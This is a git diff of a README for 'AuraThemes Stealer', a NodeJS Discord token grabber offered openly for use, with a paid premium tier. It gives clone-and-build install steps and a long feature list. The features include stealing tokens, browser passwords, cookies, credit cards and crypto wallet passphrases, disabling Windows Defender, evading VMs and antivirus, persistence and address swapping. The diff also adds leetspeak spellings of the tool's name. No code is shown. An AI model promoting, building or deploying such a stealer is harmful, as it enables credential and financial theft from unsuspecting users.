@@ -9,24 +9,15 @@
 <a href="https://github.com/k4itrun/DiscordTokenGrabber/network/members"><img src="https://img.shields.io/github/forks/k4itrun/DiscordTokenGrabber.svg?style=for-the-badge&color=c267ff" alt="Forks"></a>
 </div> 
 
+</br>
+
 <h1 align="center">AuraThemes Stealer</h1>
 
-<p align="center">Discord Token Grabber written in NodeJS, which extracts all Discord Access Tokens, browsers, crypto wallets and PC information, from each user to each drive. (PoC. For educational purposes only)</p>
+<p align="center">Discord T0k3n Gr4bb3r written in NodeJS, which extracts all Discord Access Tokens, browsers, crypto wallets and PC information, from each user to each drive. (PoC. For educational purposes only)</p>
 
----
-
-## Description
-
-Token Grabber created in NodeJS with features of a very powerful thief, this Token Grabber works by simply adding a discord webhook with which it will already send all the discord tokens and other data like local IP, username , ram information, etc...
-
-This README provides a brief overview of what a token grabber is, its potential uses, and some ethical and legal considerations. 📄
-
-## How Token Grabbers Work
-
-Token grabbers work by intercepting and capturing tokens as they are transmitted between a client and a server. This interception can occur through various means, such as exploiting vulnerabilities, man-in-the-middle attacks, or through malicious software or scripts injected into a user's device. 📂
 
 # important 
-- ⭐ **50** damn stars to this repository and add cookie session 
+- Give this repository 50 stars and add a cookie session.
 
 # Requirements
 - Downloads NodeJS Version [LTS](https://nodejs.org/en)
@@ -35,7 +26,7 @@ Token grabbers work by intercepting and capturing tokens as they are transmitted
 *I emphasize that it is very important that you have this installed, to avoid errors*
 
 ## Installation
-- Follow these steps so you can have it
+- Follow these steps to have it or watch the video [YouTube!](https://www.youtube.com/watch?v=QmbMSQoKMG8&t=91s)
 ```bash
 git clone https://github.com/k4itrun/DiscordTokenGrabber.git
 ```
@@ -48,51 +39,44 @@ npm i && node builder
 
 ## Features
 
-- List of features of this simply easy Token Grabber (✅).
-- List of features Premium (💜). 
-    - **Bypass AntiVM** It does not run in a virtual machine in case of testing ✅
-    - **Steal all viewed tokens Discord** (application and browsers) ✅
-    - **Steal Info PC** (IP Address Public/Local, UUID, CPU, GPU), Windows Product Key, Windows Mac Address & Wifi Password(s) ✅
-    - **Execution alerts (Injection) Discord** Changes (Pass, Mail, Username, Login, Added Card, Paypal, ~~Codes MFA2~~) ✅
-    - Steal Session **(Twitter, Steam Files/Session, Instagram, Roblox, Reddit, Telegram, Pigdin, TOX, ICQ)** 💜
-    - Steal **(Growtopia, Minecraft Files/Session)** 💜
-    - Steal **(Wallets App, Wallet Extensions)** 💜
-    - Inject Into **(Exodus, Atomic, Gmail, Discord)** 💜
-    - Crypto Address Swaper 💜
-    - Discord Token Grabber **(for all apps/browser(s))** 💜
-    - Steal Launcher **(Battlenet, Epicgame, RiotGames)** 💜
-    - Steal System Informations ALL 💜
-    - Anti Debug (Anti-VM/Anti Firewall) && **Debug Killer (CMD)** 💜
-    - Take a Screenshot 💜
-    - Steal in Other disk **USB/Network** 💜
-    - Steal **(Wifi Passwords & Latest Clipboard)** 💜
-    - Chromium Based Browsers **Extensions Injector** 💜
-    - Steal ANTIVIRUS installed 💜
-    - **Disable task Manager** 💜
-    - **Disable Windows Defender** 💜
-    - Add iself to startup 💜
-    - Steal **(Ubisoft, NationGlory Login)** 💜
-    - Steal **(OpenVPN, NordVPN ,ProtonVPN)** 💜
-    - Steal **(Exodus, Metamask Passphrase & Password)** 💜
-    - Open a Fake Error 💜
-    - Parse All **(Guilds/Servers Owner|Admin) & HQ Friends & HQ Bots & HQ Servers...** 💜
-    - Steal Sensitives Files & **(Passwords/Cookies/Credits cards/Autofill from All Browsers (Even Mozilla))** 💜
-    - Steal **(WinSCP, Filezilla, Putty, Shadow, Total-Commander, Steal Webcam Picture)** 💜
-    - Discord INJECTION **(2FA Disabler, Disable Discord Email Notification, Backups Codes, New(Passwords/Login/Credits/Emails))** 💜
-    - Discord INJECTION **Blocks the use of QR codes for login, Prevents requests to view devices** 💜
-    - Discord INJECTION Bypass Discord Update/Re-Install & (Bypass Better Discord | Token Protector)💜
-    - Chrome INJECTION Steal **(Cookies/History/Keylogger) & (Snipe Passwords & Steam Guard)** 💜
-    - **Bot Builder & API** Bot to build the code and turn it into an executable with API etc. 💜
-    - **0/64 Detections** Very difficult to be detected 💜 
+- List of Premium Features (💜):
+    - **Bypass AntiVM:** It prevents execution in a virtual machine during testing.
+    - **Discord Token Theft:** Steal all viewed tokens from Discord (applications and browsers).
+    - **PC Information Theft:** Gather IP address (public/local), UUID, CPU, GPU, Windows product key, Windows MAC address, and Wi-Fi password(s).
+    - **Discord Execution Alerts (Injection):** Monitor changes in Discord such as password, email, username, login, added card, PayPal, and codes for 2-factor authentication (MFA2).
+    - **Session Theft:** Steal sessions from Twitter, Steam, Instagram, Roblox, Reddit, Telegram, Pidgin, TOX, ICQ (💜).
+    - **File/Session Theft:** Steal sessions from Growtopia and Minecraft (💜).
+    - **Wallet Theft:** Steal app wallets and wallet extensions (💜).
+    - **Injection Into Applications:** Inject into Exodus, Atomic, Gmail, and Discord (💜).
+    - **Crypto Address Swapper:** Swap crypto addresses (💜).
+    - **Discord Token Grabber:** Grab tokens from all Discord apps/browsers (💜).
+    - **Launcher Theft:** Steal launchers from Battlenet, Epic Games, and Riot Games (💜).
+    - **Comprehensive System Information Theft:** Gather all system information (💜).
+    - **Anti-Debug & Debug Killer:** Prevent debugging and kill debug processes using CMD (💜).
+    - **Screenshot Capture:** Take screenshots (💜).
+    - **External Disk Theft:** Steal from USB/network disks (💜).
+    - **Additional Theft:** Steal Wi-Fi passwords and latest clipboard content (💜).
+    - **Chromium-Based Browser Extensions Injector:** Inject extensions into Chromium-based browsers (💜).
+    - **Antivirus Detection:** Detect installed antivirus programs (💜).
+    - **Task Manager Disabling:** Disable the task manager (💜).
+    - **Windows Defender Disabling:** Disable Windows Defender (💜).
+    - **Startup Addition:** Add itself to startup (💜).
+    - **Login Theft:** Steal login information from Ubisoft and NationGlory (💜).
+    - **VPN Theft:** Steal information from OpenVPN, NordVPN, and ProtonVPN (💜).
+    - **Exodus and Metamask Theft:** Steal Exodus and Metamask passphrases and passwords (💜).
+    - **Fake Error Generation:** Generate fake error messages (💜).
+    - **Parsing:** Parse guilds/servers owner/admin, HQ friends, HQ bots, and HQ servers (💜).
+    - **Sensitive File Theft:** Steal passwords, cookies, credit cards, and autofill data from all browsers (even Mozilla) (💜).
+    - **File Transfer Application Theft:** Steal from WinSCP, Filezilla, Putty, Shadow, Total-Commander, and steal webcam pictures (💜).
+    - **Discord Injection:** Disable 2FA, email notifications, backup codes, and generate new passwords, logins, credits, and emails (💜).
+    - **QR Code and Device Blocking:** Block the use of QR codes for login and prevent requests to view devices (💜).
+    - **Update/Re-Install Bypass:** Bypass Discord updates/re-installs and bypass Better Discord or Token Protector (💜).
+    - **Chrome Injection:** Steal cookies, history, and use keyloggers and snipe passwords and Steam Guard (💜).
+    - **Bot Builder and API:** Build bots and APIs to convert code into executables, etc. (💜).
+    - **Extensions & Wallets stealed:** Steal at least +40 extensions from all browsers & +10 virtual application wallets such as Ethereum, Atomic... etc. (💜).
+    - **Low Detection Rate:** Very difficult to be detected (0/64 detections) (💜).
 
 - If you want information about the premium version, contact me. 
-
-## Screenshots
-
-<img src=".github/assets/11.png" width="500">
-<img src=".github/assets/22.png" width="500">
-<img src=".github/assets/33.png" width="500">
-<img src=".github/assets/44.png" width="500">
 
 ## Star History
 
@@ -104,16 +88,20 @@ npm i && node builder
   </picture>
 </a>
 
-## Disclaimer
+<div align="center">
+<h2 align="center"><strong>Disclaimer</strong></h2>
 
-This README serves as an informational resource and does not endorse or encourage any illegal or unethical activities. Token grabbers should only be used responsibly and in compliance with applicable laws and regulations.
+This README serves as an informational resource and does not endorse or encourage any illegal or unethical activities. T0k3n gr4bb3rs should only be used responsibly and in compliance with applicable laws and regulations.
 
-## Contributing
+<h2 align="center"><strong>Contributing</strong></h2>
 
 If you have insights, suggestions, or contributions, please feel free to open an issue or submit a pull request.
 
-## License
 
-This project is licensed under the terms of the [MIT License](LICENSE).
 
-Please use this tool responsibly and in accordance with the law and ethical guidelines.
+<h2 align="center"><strong>Copyrighted</strong></h2>
+This code cannot be taken by any random person and claimed as their own. This code is protected by copyright. If you want to collaborate, create a branch or open an issue. You can also contribute, but you cannot sell this code or promote it as a sale. Credits go to the creators.
+<br>
+<br>
+- If you need help, contact <a href="https://github.com/k4itrun">k4itrun</a> -
+</div>
